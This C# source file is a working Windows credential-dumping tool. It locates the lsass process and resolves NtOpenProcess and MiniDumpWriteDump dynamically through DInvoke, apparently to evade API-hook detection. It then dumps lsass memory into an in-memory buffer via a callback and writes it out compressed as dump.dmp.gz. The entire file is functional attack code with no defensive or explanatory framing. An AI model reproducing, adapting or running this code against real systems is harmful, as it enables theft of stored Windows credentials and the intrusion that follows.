using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using DInvoke.DynamicInvoke;
using System.IO;
using System.IO.Compression;

namespace MiniDump
{
    class Program
    {
        public static byte[] dumpBuffer = new byte[200 * 1024 * 1024];
        public static int bufferSize = 0;

        //callback

        public enum MINIDUMP_CALLBACK_TYPE
        {
            ModuleCallback,
            ThreadCallback,
            ThreadExCallback,
            IncludeThreadCallback,
            IncludeModuleCallback,
            MemoryCallback,
            CancelCallback,
            WriteKernelMinidumpCallback,
            KernelMinidumpStatusCallback,
            RemoveMemoryCallback,
            IncludeVmRegionCallback,
            IoStartCallback,
            IoWriteAllCallback,
            IoFinishCallback,
            ReadMemoryFailureCallback,
            SecondaryFlagsCallback,
            IsProcessSnapshotCallback,
            VmStartCallback,
            VmQueryCallback,
            VmPreReadCallback,
            VmPostReadCallback
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct MINIDUMP_IO_CALLBACK
        {
            public IntPtr Handle;
            public ulong Offset;
            public IntPtr Buffer;
            public int BufferBytes;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct MINIDUMP_CALLBACK_INPUT
        {

            public int ProcessId;
            public IntPtr ProcessHandle;
            public MINIDUMP_CALLBACK_TYPE CallbackType;
            public MINIDUMP_IO_CALLBACK Io;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct MINIDUMP_CALLBACK_OUTPUT
        {
            public uint status;

        }


        public delegate bool CallBack(
            int CallbackParam,
            IntPtr PointerCallbackInput,
            IntPtr PointerCallbackOutput
            );

        public struct MINIDUMP_CALLBACK_INFORMATION
        {
            public IntPtr CallbackRoutine;
            public IntPtr CallbackParam;
        }

        //callback end

        //NtOpenProcess
        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IO_STATUS_BLOCK
        {
            public uint Status;
            public IntPtr Information;
        }

        

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtOpenProcessDelegate(
            ref IntPtr ProcessHandle,
            uint DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            ref CLIENT_ID ClientId);

        public const uint PROCESS_QUERY_INFORMATION = 0x0400;
        public const uint PROCESS_VM_READ = 0x0010;

        //NtOpenProcess end

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
        delegate bool MiniDumpWriteDumpDelegate(
            IntPtr hProcess,
            uint ProcessId,
            IntPtr hFile,
            int DumpType,
            IntPtr ExceptionParam,
            IntPtr UserStreamParam,
            IntPtr CallbackParam);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool NtCloseHandleDelegate(IntPtr hObject);

        


        static void Main(string[] args)
        {
            string processName = "lsass";
                        

            Process[] processes = Process.GetProcessesByName(processName);
            if (processes.Length == 0)
            {
                Console.WriteLine("[-] Process {0} not found.", processName);
                return;
            }

            Process hProcess = processes[0];
            Console.WriteLine("[+]Process {0} found with PID: {1}.", processName, hProcess.Id);

            int PID = hProcess.Id;

            IntPtr ntOpenPro = Generic.GetLibraryAddress("ntdll.dll", "NtOpenProcess", true);
            IntPtr dbghelpHandle = Generic.GetLibraryAddress("dbgcore.dll", "MiniDumpWriteDump", true);
            IntPtr ntclHandle = Generic.GetLibraryAddress("ntdll.dll", "NtClose", true);

            var ntOpenProcess = (NtOpenProcessDelegate)Marshal.GetDelegateForFunctionPointer(ntOpenPro, typeof(NtOpenProcessDelegate));
            var miniDumpWriteDump = (MiniDumpWriteDumpDelegate)Marshal.GetDelegateForFunctionPointer(dbghelpHandle, typeof(MiniDumpWriteDumpDelegate));
            var closeHandle = (NtCloseHandleDelegate)Marshal.GetDelegateForFunctionPointer(ntclHandle, typeof(NtCloseHandleDelegate));

            

            CLIENT_ID clientId = new CLIENT_ID
            {
                UniqueProcess = (IntPtr)PID,
                UniqueThread = IntPtr.Zero
            };

            OBJECT_ATTRIBUTES objectAttributesProcess = new OBJECT_ATTRIBUTES
            {
                Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES)),
                RootDirectory = IntPtr.Zero,
                ObjectName = IntPtr.Zero,
                Attributes = 0,
                SecurityDescriptor = IntPtr.Zero,
                SecurityQualityOfService = IntPtr.Zero
            };

            IntPtr processHandle = IntPtr.Zero;

            int statusProcess = ntOpenProcess(
                ref processHandle,
                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                ref objectAttributesProcess,
                ref clientId
            );

            if (statusProcess != 0 || processHandle == IntPtr.Zero)
            {
                Console.WriteLine("[-]Failing getting NtOpenProcess process handle.");
                return;
            }

            try
            {

                //callback definition

                CallBack MyCallBack = new CallBack(CallBackFunction);
                MINIDUMP_CALLBACK_INFORMATION mci;
                mci.CallbackRoutine = Marshal.GetFunctionPointerForDelegate(MyCallBack);
                mci.CallbackParam = IntPtr.Zero;
                IntPtr mci_pointer = Marshal.AllocHGlobal(Marshal.SizeOf(mci));
                Marshal.StructureToPtr(mci, mci_pointer, true);

                //callback end

               

                bool result = miniDumpWriteDump(
                    processHandle,
                    (uint)PID,
                    IntPtr.Zero, 
                    2, 
                    IntPtr.Zero,
                    IntPtr.Zero,
                    mci_pointer
                );

                if (result)
                {
                    Console.WriteLine("[+] Memory dumpped.");
                    MemoryStream memoryStream = new MemoryStream();
                    memoryStream.Write(dumpBuffer, 0, bufferSize);

                    memoryStream.Position = 0;
                    using (FileStream compressedFileStream = new FileStream("dump.dmp.gz", FileMode.Create, FileAccess.Write, FileShare.None))
                    {
                        using (GZipStream compressionStream = new GZipStream(compressedFileStream, CompressionMode.Compress))
                        {
                            memoryStream.CopyTo(compressionStream);
                            Console.WriteLine("[+] Dumpped to compressed file dump.dmp.gz.");
                        }
                    }
                }
                else
                {
                    Console.WriteLine("[-] Error dumping memory.");
                }
                
               
                closeHandle(processHandle);

               

            }
            catch (Exception ex)
            {
                Console.WriteLine("Errorx: " + ex.Message);
            }
            
        }

        public static bool CallBackFunction(int CallbackParam, IntPtr PointerCallbackInput, IntPtr PointerCallbackOutput)
        {

            var callbackInput = Marshal.PtrToStructure<MINIDUMP_CALLBACK_INPUT>(PointerCallbackInput);
            var callbackOutput = Marshal.PtrToStructure<MINIDUMP_CALLBACK_OUTPUT>(PointerCallbackOutput);

            // IoStartCallback
            if (callbackInput.CallbackType == MINIDUMP_CALLBACK_TYPE.IoStartCallback)
            {
                
                callbackOutput.status = 0x1;
                Marshal.StructureToPtr(callbackOutput, PointerCallbackOutput, true);
            }

            // IoWriteAllCallback
            if (callbackInput.CallbackType == MINIDUMP_CALLBACK_TYPE.IoWriteAllCallback)
            {
               
                Marshal.Copy(callbackInput.Io.Buffer, dumpBuffer, (int)callbackInput.Io.Offset, callbackInput.Io.BufferBytes);
                bufferSize += callbackInput.Io.BufferBytes;
                
                callbackOutput.status = 0;
                Marshal.StructureToPtr(callbackOutput, PointerCallbackOutput, true);
            }

            // IoWriteAllCallback
            if (callbackInput.CallbackType == MINIDUMP_CALLBACK_TYPE.IoFinishCallback)
            {
                
                callbackOutput.status = 0;
                Marshal.StructureToPtr(callbackOutput, PointerCallbackOutput, true);
            }

            return true; 
        }


    }
}

